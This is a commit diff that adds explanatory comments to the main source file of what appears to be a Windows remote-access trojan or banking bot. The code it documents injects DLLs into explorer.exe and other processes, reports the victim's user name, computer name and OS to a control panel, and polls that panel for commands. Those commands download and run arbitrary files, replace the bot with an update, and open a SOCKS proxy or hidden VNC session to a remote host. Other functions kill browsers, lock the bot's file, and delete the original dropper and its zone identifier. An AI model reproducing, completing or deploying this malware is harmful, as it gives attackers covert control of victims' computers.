ce85e5a5cfd356e3dceda2a9d14c7eab6fc7c30b
srbgd <20709558+srbgd@users.noreply.github.com>
2018-06-17 03:00:03 +0300

    Bot/Bot.cpp commented

--- Bot/Bot.cpp
+++ Bot/Bot.cpp
@@ -12,6 +12,7 @@ DWORD  g_hBrowserPids2kill[MAX_PATH] = { 0 };
 
 static void InjectPid(DWORD pid)
 {
+   // open the process for injection
    HANDLE hProcess = Funcs::pOpenProcess
    (
       PROCESS_VM_OPERATION |
@@ -22,14 +23,18 @@ static void InjectPid(DWORD pid)
       FALSE, 
       pid
    );
+   // check if it is x64 process
    BOOL   x64      = IsProcessX64(hProcess);
+   // choose a suitable dll
    BYTE *dllBuffer = x64 ? g_dll64 : g_dll32;
+   // inject dll
    BOOL injected   = InjectDll(dllBuffer, hProcess, x64);
    Funcs::pCloseHandle(hProcess);
 }
 
 static DWORD WINAPI InjectionServerThread(LPVOID lpParam)
 {
+   // the code of this fucntion is self explanatory enough
    char pipeName[MAX_PATH] = { 0 };
    char botId[BOT_ID_LEN]  = { 0 };
    GetBotId(botId);
@@ -75,12 +80,15 @@ static DWORD WINAPI InjectionServerThread(LPVOID lpParam)
 static void LockBotExe()
 {
    CHAR botPath[MAX_PATH] = { 0 };
+   // get bots executable installed in appdata
    GetInstallPath(botPath);
+   // open this file for reading in order to prevent from reading it by other programms
    g_hBotExe = Funcs::pCreateFileA(botPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 }
 
 static BOOL DownloadExecute(char *url, char *tempPath, BOOL execute, BOOL validateExe)
 {
+   // initialize http request
    URL_COMPONENTSA urlComponents = { 0 };
    urlComponents.dwStructSize = sizeof(urlComponents);
 
@@ -99,27 +107,36 @@ static BOOL DownloadExecute(char *url, char *tempPath, BOOL execute, BOOL valida
       request.port            = urlComponents.nPort;
       request.path            = urlComponents.lpszUrlPath;
       request.post            = FALSE;
+      // send http request
       if(HttpSubmitRequest(request))
       {
+         // verify that response is an executable file if it is necessary
          if((validateExe && VerifyPe(request.outputBody, request.outputBodySize)) || !validateExe)
          {
+            // get the name of the downloaded file on the server (path is in url format. does it always work?)
             char *fileName = Funcs::pPathFindFileNameA(path);
             if(fileName != path)
             {
+               // get path to temp folder
                Funcs::pGetTempPathA(MAX_PATH, tempPath);
+               // get a random file name with .TMP extention in file folder
                Funcs::pGetTempFileNameA(tempPath, "", 0, tempPath);
+               // append the original file name to the path to the temp file
                Funcs::pLstrcatA(tempPath, ".");
                Funcs::pLstrcatA(tempPath, fileName);
+               // create temp file
                HANDLE hFile = Funcs::pCreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                if(hFile)
                {
                   DWORD written;
+                  // write there the content of the downloaded file
                   if(Funcs::pWriteFile(hFile, request.outputBody, request.outputBodySize, &written, NULL))
                   {
                      Funcs::pFree(request.outputBody);
                      Funcs::pCloseHandle(hFile);
                      if(!execute)
                         return TRUE;
+                     // open the downloaded file with displayed window
                      if(Funcs::pShellExecuteA(NULL, Strs::open, tempPath, NULL, NULL, SW_SHOW) > (HINSTANCE) 32)
                         return TRUE; 
                   }
@@ -142,6 +159,7 @@ static void HandleCommand(CommandType type, char *param)
       case COMMAND_DL_EXEC:
       {
          char tempPath[MAX_PATH] = { 0 };
+         // execute a file downloaded from url stored in param and execute it (it can be any file which function shellexecute can open. for example exe or bat)
          DownloadExecute(param, tempPath, TRUE, FALSE);
          break;
       }
@@ -149,11 +167,16 @@ static void HandleCommand(CommandType type, char *param)
       {
          char tempPath   [MAX_PATH] = { 0 };
          char installPath[MAX_PATH] = { 0 };
+         // download a PE file in temp folder (path to this file is stored in tempPath)
          if(DownloadExecute(param, tempPath, FALSE, TRUE))
          {
+            // get the path to the file in appdata
             GetInstallPath(installPath);
+            // unlock the file (locked in startbot)
             Funcs::pCloseHandle(g_hBotExe);
+            // replace the old file with downloaded one
             Funcs::pCopyFileA(tempPath, installPath, FALSE);
+            // lock this file again
             LockBotExe();
          }
          break;
@@ -165,12 +188,17 @@ static void HandleCommand(CommandType type, char *param)
          char *port = Funcs::pStrChrA(param, ':');
          if(port)
          {
+            // terminate the param string (param is located before the null character and port is located after this character)
             *port = 0;
             ++port;
+            // get the port number
             int portInt = Funcs::pStrtol(port, NULL, 10);
+            // choose the methos of connection to this host
             if(type == COMMAND_SOCKS)
+               // run socks server module
                StartSocksClient(host, portInt);
             else
+               // run pseudo VNC module
                StartHiddenDesktop(host, portInt);
          }
          break;
@@ -185,7 +213,9 @@ static void HandleCommand(CommandType type, char *param)
 */
 static DWORD WINAPI KillBrowsersThread(LPVOID lpParam)
 {
+   // sleep 30 min
    Funcs::pSleep(1000 * 60 * 30);
+   // kill all browsers previously written in the list
    for(int i = 0; i < sizeof(g_hBrowserPids2kill); ++i)
    {
       if(!g_hBrowserPids2kill[i])
@@ -199,17 +229,20 @@ static DWORD WINAPI KillBrowsersThread(LPVOID lpParam)
 
 static void StartKillBrowsersThread()
 {
+   // get list of all processes
    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize         = sizeof(processEntry);
    HANDLE hProcessSnap         = Funcs::pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD browserPidsNum        = 0;
    Funcs::pProcess32First(hProcessSnap, &processEntry);
+   // for each process check if it is a browser
    do
    {
       if(Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::chromeExe) == 0 ||
          Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::firefoxExe) == 0 ||
          Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::iexploreExe) == 0)
       {
+         // add PID of found browser in kill list
          if(sizeof(g_hBrowserPids2kill) > browserPidsNum)
          {
             g_hBrowserPids2kill[browserPidsNum] = processEntry.th32ProcessID;
@@ -233,16 +266,20 @@ static void SendBotInfo()
    SYSTEM_INFO      info               = { 0 };
    OSVERSIONINFOEXA osVersion          = { 0 };
 
+   // get names
    Funcs::pGetUserNameW(userName, &nameSize);
    nameSize = MAX_PATH;
    Funcs::pGetComputerNameW(compName, &nameSize);
 
+   // convert names
    userNameA = Utf16toUtf8(userName);
    compNameA = Utf16toUtf8(compName);
 
+   // get systen info
    Funcs::pGetNativeSystemInfo(&info);
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);
    Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
+   // create a string containing gathered information separated by pipeline symbol
    Funcs::pWsprintfA
    (
       command, 
@@ -255,6 +292,7 @@ static void SendBotInfo()
       userNameA, 
       (info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
    );
+   // send created string on the server
    char *toFree = PanelRequest(command, NULL);
    Funcs::pFree(toFree);
 }
@@ -269,11 +307,13 @@ static DWORD WINAPI CommandPollThread(LPVOID lpParam)
       SetStartupValue(installPath);
       //start of real command poll
       char command[32]    = { 0 };
+      // send ping command to te server
       Funcs::pLstrcpyA(command, Strs::pingRequest);
       char *startResponse = PanelRequest(command, NULL);
       char *response      = startResponse;
       if(response)
       {
+         // first response
          if(!Funcs::pLstrcmpA(response, "0"))
             SendBotInfo();
          else
@@ -281,20 +321,31 @@ static DWORD WINAPI CommandPollThread(LPVOID lpParam)
             for(;;)
             {
                char *commandTypeStr = response;
+               // find param separator
                char *param       = Funcs::pStrChrA(response, '|');
+               // find command separator
                char *nextCommand = Funcs::pStrStrA(response, Strs::winNewLine);
+               // if next command is found
                if(nextCommand)
                {
+                  // delete found separator (windows new line characters) and terminate the string (each command has only one parameter which is stored between param separator and command separator)
                   *nextCommand = 0;
+                  // goto the next command and skip command separator
                   response     = nextCommand + 2;
                }
+               // if next parameter is found
                if(param)
                {
+                  // delete found separator (pipeline character)
                   *param = 0;
+                  // skip the separator
                   ++param;
+                  // get the command number
                   CommandType type = (CommandType) Funcs::pStrtol(commandTypeStr, NULL, 10);
-                  HandleCommand(type, param);  
+                  // execute the command
+                  HandleCommand(type, param);
                }
+               // terminate the loop
                if(!nextCommand)
                   break;
             }
@@ -308,7 +359,9 @@ static DWORD WINAPI CommandPollThread(LPVOID lpParam)
 
 static HANDLE InjectExplorer()
 {
+   // get pid of explorer.exe
    DWORD pid = GetPidExplorer();
+   // inject current dll in explorer.exe
    InjectPid(pid);
    return Funcs::pOpenProcess(SYNCHRONIZE, FALSE, pid);
 }
@@ -317,16 +370,21 @@ static void UpdateDllsThread()
 {
    for(;;)
    {
+      // replace old dlls in temp folder with new ones
       GetDlls(NULL, NULL, TRUE);
+      // sleep 5 mins
       Funcs::pSleep(1000 * 60 * 5);
    }
 }
 
 static DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
 {
+   // infinitely inject explorer.exe after every restart
    for(;;)
    {
+      // inject explorer.exe
       HANDLE hExplorer = InjectExplorer();
+      // wait for its termination (restart)
       Funcs::pWaitForSingleObject(hExplorer, INFINITE);
       Funcs::pCloseHandle(hExplorer);
    }
@@ -336,7 +394,9 @@ static DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
 static void Melt()
 {
    char temp[MAX_PATH];
+   // temp = path to temp folder + botid (this name belongs to a file where loader wrote the path to original PE file launched by the user)
    GetTempPathBotPrefix(temp);
+   // open this file for reading
    HANDLE hFile = Funcs::pCreateFileA
    (
       temp, 
@@ -349,11 +409,13 @@ static void Melt()
    );
    if(hFile != INVALID_HANDLE_VALUE)
    {
+      // delete zone identifier of loader in appdata
       char exeZoneId[MAX_PATH];
       GetInstallPath(exeZoneId);
       Funcs::pLstrcatA(exeZoneId, Strs::zoneId);
       Funcs::pDeleteFileA(exeZoneId);
 
+      // delete original loader executable and the file with its (original loader exe) path in temp folder
       DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
       DWORD read;
       char deletePath[MAX_PATH];
@@ -365,21 +427,28 @@ static void Melt()
    }
 }
 
+// runs only when x86 dll injected in dllhost.exe
 void StartBot()
 {          
    char botId[BOT_ID_LEN] = { 0 };
+   // check if the bot already exists
    GetBotId(botId);
    HANDLE g_hBotMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
    if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
       Funcs::pExitProcess(0);
 
+   // lock bots executable in appdata
    LockBotExe();
 
+   // download both dlls
    GetDlls(&g_dll32, &g_dll64, FALSE);
+   // delete files left after first launch
    Melt();
    Funcs::pCreateThread(NULL, 0, InjectExplorerThread, NULL, 0, NULL);
    Funcs::pCreateThread(NULL, 0, InjectionServerThread, NULL, 0, NULL);
+   // send information about PC on the server
    SendBotInfo();
    Funcs::pCreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);
+   // run infinity loop of downloading dlls from the server
    UpdateDllsThread();
 }
